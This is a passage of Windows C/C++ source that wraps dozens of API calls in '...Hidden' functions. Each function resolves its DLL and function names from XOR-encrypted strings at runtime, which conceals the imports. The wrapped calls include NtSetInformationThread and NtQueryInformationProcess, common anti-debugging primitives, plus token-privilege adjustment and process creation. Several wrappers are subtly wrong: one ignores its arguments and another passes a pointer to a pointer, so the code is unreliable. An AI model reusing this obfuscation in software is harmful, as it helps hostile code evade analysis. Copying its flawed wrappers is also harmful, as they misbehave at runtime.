	return (HBRUSH)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*CreateSolidBrush*/XorStr<0xDB, 17, 0x20CBCF14>("\x98\xAE\xB8\xBF\xAB\x85\xB2\x8D\x8F\x8D\x81\xA4\x95\x9D\x9A\x82" + 0x20CBCF14).s, 1, color);
}

COLORREF SetTextColorHidden(HDC hdc, COLORREF color)
{
	return (COLORREF)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*SetTextColor*/XorStr<0xE2, 13, 0xCF941D9D>("\xB1\x86\x90\xB1\x83\x9F\x9C\xAA\x85\x87\x83\x9F" + 0xCF941D9D).s, 2, color, hdc);
}

int FillRectHidden(HDC hDC, CONST RECT* lprc, HBRUSH hbr)
{
	return (int)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*FillRect*/XorStr<0x24, 9, 0x08662804>("\x62\x4C\x4A\x4B\x7A\x4C\x49\x5F" + 0x08662804).s, 3, hbr, lprc, hDC);
}

int FrameRectHidden(HDC hDC, CONST RECT* lprc, HBRUSH hbr)
{
	return (int)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*FrameRect*/XorStr<0xD9, 10, 0xCEABCFB2>("\x9F\xA8\xBA\xB1\xB8\x8C\xBA\x83\x95" + 0xCEABCFB2).s, 3, hbr, lprc, hDC);
}

BOOL GlobalUnlockHidden(HGLOBAL hMem)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GlobalUnlock*/XorStr<0xE3, 13, 0x3D73C6FF>("\xA4\x88\x8A\x84\x86\x84\xBC\x84\x87\x83\x8E\x85" + 0x3D73C6FF).s, 1, hMem);
}

HGLOBAL GlobalFreeHidden(HGLOBAL hMem)
{
	return (HGLOBAL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GlobalFree*/XorStr<0x75, 11, 0xD5C71605>("\x32\x1A\x18\x1A\x18\x16\x3D\x0E\x18\x1B" + 0xD5C71605).s, 1, hMem);
}

HRSRC FindResourceHidden(HMODULE hModule, LPCSTR lpName, LPCSTR lpType)
{
	return (HRSRC)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*FindResourceA*/XorStr<0xE6, 14, 0x0BCF9854>("\xA0\x8E\x86\x8D\xB8\x8E\x9F\x82\x9B\x9D\x93\x94\xB3" + 0x0BCF9854).s, 3, lpType, lpName, hModule);
}

DWORD SizeofResourceHidden(HMODULE hModule, HRSRC hResInfo)
{
	return (DWORD)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*SizeofResource*/XorStr<0x39, 15, 0x12A257C8>("\x6A\x53\x41\x59\x52\x58\x6D\x25\x32\x2D\x36\x36\x26\x23" + 0x12A257C8).s, 2, hResInfo, hModule);
}

HGLOBAL LoadResourceHidden(HMODULE hModule, HRSRC hResInfo)
{
	return (HGLOBAL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*LoadResource*/XorStr<0x7A, 13, 0x77C0CF7D>("\x36\x14\x1D\x19\x2C\x1A\xF3\xEE\xF7\xF1\xE7\xE0" + 0x77C0CF7D).s, 2, hResInfo, hModule);
}

LPVOID LockResourceHidden(HGLOBAL hResData)
{
	return (LPVOID)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*LockResource*/XorStr<0x5A, 13, 0xD38C78F8>("\x16\x34\x3F\x36\x0C\x3A\x13\x0E\x17\x11\x07\x00" + 0xD38C78F8).s, 1, hResData);
}

HGLOBAL GlobalAllocHidden(UINT uFlags, SIZE_T dwBytes)
{
	return (HGLOBAL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GlobalAlloc*/XorStr<0xA4, 12, 0xA967EE96>("\xE3\xC9\xC9\xC5\xC9\xC5\xEB\xC7\xC0\xC2\xCD" + 0xA967EE96).s, 2, dwBytes, uFlags);
}

LPVOID GlobalLockHidden(HGLOBAL hMem)
{
	return (LPVOID)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GlobalLock*/XorStr<0x1A, 11, 0x4BBFD312>("\x5D\x77\x73\x7F\x7F\x73\x6C\x4E\x41\x48" + 0x4BBFD312).s, 1, hMem);
}

HRESULT CreateStreamOnHGlobalHidden(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM FAR* ppstm)
{
	return (HRESULT)callWinAPIFunction(/*ole32.dll*/XorStr<0x1A, 10, 0xC455E183>("\x75\x77\x79\x2E\x2C\x31\x44\x4D\x4E" + 0xC455E183).s,/*CreateStreamOnHGlobal*/XorStr<0x31, 22, 0xD3C78BF7>("\x72\x40\x56\x55\x41\x53\x64\x4C\x4B\x5F\x5A\x51\x72\x50\x77\x07\x2D\x2D\x21\x25\x29" + 0xD3C78BF7).s, 3, ppstm, fDeleteOnRelease, hGlobal);
}

int SetBkModeHidden(HDC hdc, int mode)
{
	return (int)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*SetBkMode*/XorStr<0x9E, 10, 0x4A135879>("\xCD\xFA\xD4\xE3\xC9\xEE\xCB\xC1\xC3" + 0x4A135879).s, 2, mode, hdc);
}

int GetWindowTextLengthHidden(HWND hWnd)
{
	return (int)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*GetWindowTextLengthA*/XorStr<0xBD, 21, 0x42E7BD77>("\xFA\xDB\xCB\x97\xA8\xAC\xA7\xAB\xB2\x92\xA2\xB0\xBD\x86\xAE\xA2\xAA\xBA\xA7\x91" + 0x42E7BD77).s, 1, hWnd);
}

int GetWindowTextHidden(HWND hWnd, LPSTR lpString, int nMaxCount)
{
	return (int)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*GetWindowTextA*/XorStr<0x9B, 15, 0x54F7992E>("\xDC\xF9\xE9\xC9\xF6\xCE\xC5\xCD\xD4\xF0\xC0\xDE\xD3\xE9" + 0x54F7992E).s, 3, nMaxCount, lpString, hWnd);
}

int DrawTextHidden(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format)
{
	return (int)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*DrawTextA*/XorStr<0xFC, 10, 0x3027B154>("\xB8\x8F\x9F\x88\x54\x64\x7A\x77\x45" + 0x3027B154).s, 5, format, lprc, cchText, lpchText, hdc);
}

HPEN CreatePenHidden(int iStyle, int cWidth, COLORREF color)
{
	return (HPEN)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*CreatePen*/XorStr<0x1C, 10, 0x7C4F2CFD>("\x5F\x6F\x7B\x7E\x54\x44\x72\x46\x4A" + 0x7C4F2CFD).s, 3, color, cWidth, iStyle);
}

BOOL RoundRectHidden(HDC hdc, int left, int top, int right, int bottom, int width, int height)
{
	return (BOOL)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*RoundRect*/XorStr<0xEA, 10, 0x67CFA6B3>("\xB8\x84\x99\x83\x8A\xBD\x95\x92\x86" + 0x67CFA6B3).s, 7, height, width, bottom, right, top, left, hdc);
}

BOOL DeleteObjectHidden(HGDIOBJ ho)
{
	return (BOOL)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*DeleteObject*/XorStr<0x38, 13, 0x51B875A8>("\x7C\x5C\x56\x5E\x48\x58\x71\x5D\x2A\x24\x21\x37" + 0x51B875A8).s, 1, ho);
}

BOOL GetMessageHidden(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*GetMessageA*/XorStr<0x44, 12, 0xD6724240>("\x03\x20\x32\x0A\x2D\x3A\x39\x2A\x2B\x28\x0F" + 0xD6724240).s, 4, wMsgFilterMax, wMsgFilterMin, hWnd, lpMsg);
}

BOOL TranslateMessageHidden(CONST MSG* lpMsg)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*TranslateMessage*/XorStr<0x7C, 17, 0xF4DCFE1B>("\x28\x0F\x1F\x11\xF3\xED\xE3\xF7\xE1\xC8\xE3\xF4\xFB\xE8\xED\xEE" + 0xF4DCFE1B).s, 1, lpMsg);
}

LRESULT DispatchMessageHidden(CONST MSG* lpMsg)
{
	return (LRESULT)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*DispatchMessageA*/XorStr<0x9C, 17, 0x7DA4149E>("\xD8\xF4\xED\xEF\xC1\xD5\xC1\xCB\xE9\xC0\xD5\xD4\xC9\xCE\xCF\xEA" + 0x7DA4149E).s, 1, lpMsg);
}

BOOL MoveToExHidden(HDC hdc, int x, int y, LPPOINT lppt)
{
	return (BOOL)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*MoveToEx*/XorStr<0xBC, 9, 0x8C9B5EFC>("\xF1\xD2\xC8\xDA\x94\xAE\x87\xBB" + 0x8C9B5EFC).s, 4, lppt, y, x, hdc);
}

BOOL LineToHidden(HDC hdc, int x, int y)
{
	return (BOOL)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*LineTo*/XorStr<0xF7, 7, 0x84B9D563>("\xBB\x91\x97\x9F\xAF\x93" + 0x84B9D563).s, 3, y, x, hdc);
}

HDC BeginPaintHidden(HWND hWnd, LPPAINTSTRUCT lpPaint)
{
	return (HDC)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*BeginPaint*/XorStr<0xDC, 11, 0x5357A702>("\x9E\xB8\xB9\xB6\x8E\xB1\x83\x8A\x8A\x91" + 0x5357A702).s, 2, lpPaint, hWnd);
}

BOOL EndPaintHidden(HWND hWnd, CONST PAINTSTRUCT* lpPaint)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*EndPaint*/XorStr<0x3C, 9, 0x330EEE68>("\x79\x53\x5A\x6F\x21\x28\x2C\x37" + 0x330EEE68).s, 2, lpPaint, hWnd);
}

BOOL SetDlgItemTextHidden(HWND hDlg, int nIDDlgItem, LPCSTR lpString)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*SetDlgItemTextA*/XorStr<0x03, 16, 0xD58223FA>("\x50\x61\x71\x42\x6B\x6F\x40\x7E\x6E\x61\x59\x6B\x77\x64\x50" + 0xD58223FA).s, 3, lpString, nIDDlgItem, hDlg);
}

void PostQuitMessageHidden(int nExitCode)
{
	callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*PostQuitMessage*/XorStr<0x04, 16, 0x1461E979>("\x54\x6A\x75\x73\x59\x7C\x63\x7F\x41\x68\x7D\x7C\x71\x76\x77" + 0x1461E979).s, 1, nExitCode);
}

LRESULT DefWindowProcHidden(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	return (LRESULT)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*DefWindowProcA*/XorStr<0xA3, 15, 0xC89BF420>("\xE7\xC1\xC3\xF1\xCE\xC6\xCD\xC5\xDC\xFC\xDF\xC1\xCC\xF1" + 0xC89BF420).s, 4, lParam, wParam, Msg, hWnd);
}

BOOL PostMessageHidden(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*PostMessageA*/XorStr<0x3F, 13, 0xE8BE6FB7>("\x6F\x2F\x32\x36\x0E\x21\x36\x35\x26\x2F\x2C\x0B" + 0xE8BE6FB7).s, 4, lParam, wParam, Msg, hWnd);
}

BOOL GetUserNameHidden(LPTSTR lpBuffer, LPDWORD lpnSize)
{

	return (BOOL)callWinAPIFunction(/*Advapi32.dll*/XorStr<0x31, 13, 0xCFEFB911>("\x70\x56\x45\x55\x45\x5F\x04\x0A\x17\x5E\x57\x50" + 0xCFEFB911).s, /*GetUserNameA*/XorStr<0xA3, 13, 0x70E91097>("\xE4\xC1\xD1\xF3\xD4\xCD\xDB\xE4\xCA\xC1\xC8\xEF" + 0x70E91097).s, 2, &lpnSize, lpBuffer);
}

BOOL OpenProcessTokenHidden(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)
{
	return (BOOL)callWinAPIFunction(/*Advapi32.dll*/XorStr<0x31, 13, 0xCFEFB911>("\x70\x56\x45\x55\x45\x5F\x04\x0A\x17\x5E\x57\x50" + 0xCFEFB911).s,/*OpenProcessToken*/XorStr<0xD6, 17, 0x03D8F3F6>("\x99\xA7\xBD\xB7\x8A\xA9\xB3\xBE\xBB\xAC\x93\xB5\x8D\x88\x81\x8B" + 0x03D8F3F6).s, 3, TokenHandle, DesiredAccess, ProcessHandle);
}

HANDLE GetCurrentProcessHidden()
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetCurrentProcess*/XorStr<0xFC, 18, 0x6E45F066>("\xBB\x98\x8A\xBC\x75\x73\x70\x66\x6A\x71\x56\x75\x67\x6A\x6F\x78\x7F" + 0x6E45F066).s, 0);
}


BOOL LookupprivilegeValueHidden(LPCTSTR lpSystemname, LPCTSTR lpname, PLUID lpLuid)
{
	return (BOOL)callWinAPIFunction(/*Advapi32.dll*/XorStr<0x31, 13, 0xCFEFB911>("\x70\x56\x45\x55\x45\x5F\x04\x0A\x17\x5E\x57\x50" + 0xCFEFB911).s,/*LookupPrivilegeValue*/XorStr<0x79, 21, 0x8BAB7CBA>("\x35\x15\x14\x17\x08\x0E\x2F\xF2\xE8\xF4\xEA\xE8\xE0\xE1\xE2\xDE\xE8\xE6\xFE\xE9" + 0x8BAB7CBA).s, 3, lpLuid, lpname, lpSystemname);
}

BOOL AdjustTokenPrivilegesHidden(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength)
{
	return (BOOL)callWinAPIFunction(/*Advapi32.dll*/ XorStr<0x31, 13, 0xCFEFB911>("\x70\x56\x45\x55\x45\x5F\x04\x0A\x17\x5E\x57\x50" + 0xCFEFB911).s, /*AdjustTokenPrivileges*/XorStr<0x41, 22, 0xA7C6BF4E>("\x00\x26\x29\x31\x36\x32\x13\x27\x22\x2F\x25\x1C\x3F\x27\x39\x39\x3D\x37\x34\x31\x26" + 0xA7C6BF4E).s, 6, ReturnLength, PreviousState, BufferLength, NewState, DisableAllPrivileges, TokenHandle);
}

BOOL HeapFreeHidden(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*HeapFree*/XorStr<0xF7, 9, 0x09CC8E0F>("\xBF\x9D\x98\x8A\xBD\x8E\x98\x9B" + 0x09CC8E0F).s, 3, lpMem, dwFlags, hHeap);
}

HANDLE GetProcessHeapHidden()
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetProcessHeap*/XorStr<0x64, 15, 0x96F05735>("\x23\x00\x12\x37\x1A\x06\x09\x0E\x1F\x1E\x26\x0A\x11\x01" + 0x96F05735).s, 0);
}

VOID FreeLibraryAndExitThreadHidden(HMODULE hModule, DWORD dwExitCode)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s, /*FreeLibraryAndExitThread*/XorStr<0x7D, 25, 0x214561D9>("\x3B\x0C\x1A\xE5\xCD\xEB\xE1\xF6\xE4\xF4\xFE\xC9\xE7\xEE\xCE\xF4\xE4\xFA\xDB\xF8\xE3\xF7\xF2\xF0" + 0x214561D9).s, 0);
}

HANDLE CreateThreadHidden(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*CreateThread*/XorStr<0xE0, 13, 0x8E9AA9B6>("\xA3\x93\x87\x82\x90\x80\xB2\x8F\x9A\x8C\x8B\x8F" + 0x8E9AA9B6).s, 6, lpThreadId, dwCreationFlags, lpParameter, lpStartAddress, dwStackSize, lpThreadAttributes);
}

COLORREF SetBkColorHidden(HDC hdc, COLORREF crColor)
{
	return (COLORREF)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*SetBkColor*/XorStr<0x18, 11, 0xF2E37E03>("\x4B\x7C\x6E\x59\x77\x5E\x71\x73\x4F\x53" + 0xF2E37E03).s, 2, crColor, hdc);
}

COLORREF SetDCBrushColorHidden(HDC hdc, COLORREF crColor)
{
	return (COLORREF)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*SetDCBrushColor*/XorStr<0xD9, 16, 0x938E7D88>("\x8A\xBF\xAF\x98\x9E\x9C\xAD\x95\x92\x8A\xA0\x8B\x89\x89\x95" + 0x938E7D88).s, 2, crColor, hdc);
}

HGDIOBJ GetStockObjectHidden(int fnObject)
{
	return (HGDIOBJ)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*GetStockObject*/XorStr<0x26, 15, 0x580CE66A>("\x61\x42\x5C\x7A\x5E\x44\x4F\x46\x61\x4D\x5A\x54\x51\x47" + 0x580CE66A).s, 1, fnObject);
}

BOOL ShowWindowHidden(HWND hWnd, int nCmdShow)
{
	return (BOOL)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*ShowWindow*/XorStr<0x1F, 11, 0x7EF36BC7>("\x4C\x48\x4E\x55\x74\x4D\x4B\x42\x48\x5F" + 0x7EF36BC7).s, 2, nCmdShow, hWnd);
}

HBRUSH CreatePatternBrushHidden(HBITMAP hBmp)
{
	return (HBRUSH)callWinAPIFunction(/*GDI32.dll*/XorStr<0xCC, 10, 0xF69622B0>("\x8B\x89\x87\xFC\xE2\xFF\xB6\xBF\xB8" + 0xF69622B0).s,/*CreatePatternBrush*/XorStr<0xAF, 19, 0xD3541C9A>("\xEC\xC2\xD4\xD3\xC7\xD1\xE5\xD7\xC3\xCC\xDC\xC8\xD5\xFE\xCF\xCB\xCC\xA8" + 0xD3541C9A).s, 1, hBmp);
}

HBITMAP LoadBitmapHidden(HINSTANCE hInstance, LPCTSTR lpBitmapName)
{
	return (HBITMAP)callWinAPIFunction(/*USER32.dll*/XorStr<0x8C, 11, 0xDDC2F05A>("\xD9\xDE\xCB\xDD\xA3\xA3\xBC\xF7\xF8\xF9" + 0xDDC2F05A).s,/*LoadBitmapA*/XorStr<0xEB, 12, 0xDA8E42F9>("\xA7\x83\x8C\x8A\xAD\x99\x85\x9F\x92\x84\xB4" + 0xDA8E42F9).s, 2, lpBitmapName, hInstance);
}

NTSTATUS NtQueryInformationProcessHidden(HANDLE ProcessHandle, UINT ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength)
{
	return (NTSTATUS)callWinAPIFunction(/*Ntdll.dll*/XorStr<0xAD, 10, 0x65383494>("\xE3\xDA\xCB\xDC\xDD\x9C\xD7\xD8\xD9" + 0x65383494).s,/*NtQueryInformationProcess*/XorStr<0x4F, 26, 0x431E0467>("\x01\x24\x00\x27\x36\x26\x2C\x1F\x39\x3E\x36\x28\x36\x3D\x29\x37\x30\x0E\x31\x10\x0C\x07\x00\x15\x14" + 0x431E0467).s, 5, ReturnLength, ProcessInformationLength, ProcessInformation, ProcessInformationClass, ProcessHandle);
}

//NtSetInformationThreadHidden
NTSTATUS NtSetInformationThreadHidden(HANDLE ThreadHandle, UINT ThreadInformationClass, PVOID pMem, ULONG ulBuf)
{
	return (NTSTATUS)callWinAPIFunction(/*Ntdll.dll*/XorStr<0xAD, 10, 0x65383494>("\xE3\xDA\xCB\xDC\xDD\x9C\xD7\xD8\xD9" + 0x65383494).s,/*NtSetInformationThread*/XorStr<0x9F, 23, 0x1959284A>("\xD1\xD4\xF2\xC7\xD7\xED\xCB\xC0\xC8\xDA\xC4\xCB\xDF\xC5\xC2\xC0\xFB\xD8\xC3\xD7\xD2\xD0" + 0x1959284A).s, 4, ulBuf, pMem, ThreadInformationClass, ThreadHandle);
}

HANDLE GetCurrentThreadHidden()
{
	return (HANDLE)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetCurrentThread*/XorStr<0x51, 17, 0xF8818EB8>("\x16\x37\x27\x17\x20\x24\x25\x3D\x37\x2E\x0F\x34\x2F\x3B\x3E\x04" + 0xF8818EB8).s, 0);
}

VOID GetStartupInfoHidden(LPSTARTUPINFO lpStartupInfo)
{
	callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetStartupInfo*/XorStr<0x29, 15, 0x7D00CD00>("\x6E\x4F\x5F\x7F\x59\x4F\x5D\x44\x44\x42\x7A\x5A\x53\x59" + 0x7D00CD00).s, 1, lpStartupInfo);
}

BOOL CreateProcessHidden(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*CreateProcess*/XorStr<0xBB, 14, 0x177BFB2E>("\xF8\xCE\xD8\xDF\xCB\xA5\x91\xB0\xAC\xA7\xA0\xB5\xB4" + 0x177BFB2E).s, 10, lpProcessInformation, lpStartupInfo, lpCurrentDirectory, lpEnvironment, dwCreationFlags, bInheritHandles, lpThreadAttributes, lpProcessAttributes, lpCommandLine, lpApplicationName);
}

LPTSTR GetCommandLineHidden(VOID)
{
	return (LPTSTR)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*GetCommandLine*/XorStr<0x87, 15, 0x5CCDF9E1>("\xC0\xED\xFD\xC9\xE4\xE1\xE0\xEF\xE1\xF4\xDD\xFB\xFD\xF1" + 0x5CCDF9E1).s, 0);
}

BOOL ContinueDebugEventHidden(DWORD dwProcessId, DWORD dwThreadId, DWORD dwContinueStatus)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*ContinueDebugEvent*/XorStr<0xED, 19, 0xCFAB93E6>("\xAE\x81\x81\x84\x98\x9C\x86\x91\xB1\x93\x95\x8D\x9E\xBF\x8D\x99\x93\x8A" + 0xCFAB93E6).s, 3, dwContinueStatus, dwThreadId, dwProcessId);
}

BOOL WaitForDebugEventHidden(_Out_ LPDEBUG_EVENT lpDebugEvent, _In_ DWORD dwMilliseconds)
{
	return (BOOL)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*WaitForDebugEvent*/XorStr<0x1C, 18, 0xA046D387>("\x4B\x7C\x77\x6B\x66\x4E\x50\x67\x41\x47\x53\x40\x6D\x5F\x4F\x45\x58" + 0xA046D387).s, 2, dwMilliseconds, lpDebugEvent);
}

LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilterHidden(_In_opt_ LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
{
	return (LPTOP_LEVEL_EXCEPTION_FILTER)callWinAPIFunction(/*kernel32.dll*/XorStr<0x4C, 13, 0x79547E8B>("\x27\x28\x3C\x21\x35\x3D\x61\x61\x7A\x31\x3A\x3B" + 0x79547E8B).s,/*SetUnhandledExceptionFilter*/XorStr<0x58, 28, 0xB581990D>("\x0B\x3C\x2E\x0E\x32\x35\x3F\x31\x04\x0D\x07\x07\x21\x1D\x05\x02\x18\x1D\x03\x04\x02\x2B\x07\x03\x04\x14\x00" + 0xB581990D).s, 1, lpTopLevelExceptionFilter);
}

ATOM RegisterClassHidden(const WNDCLASS* lpWndClass)
{
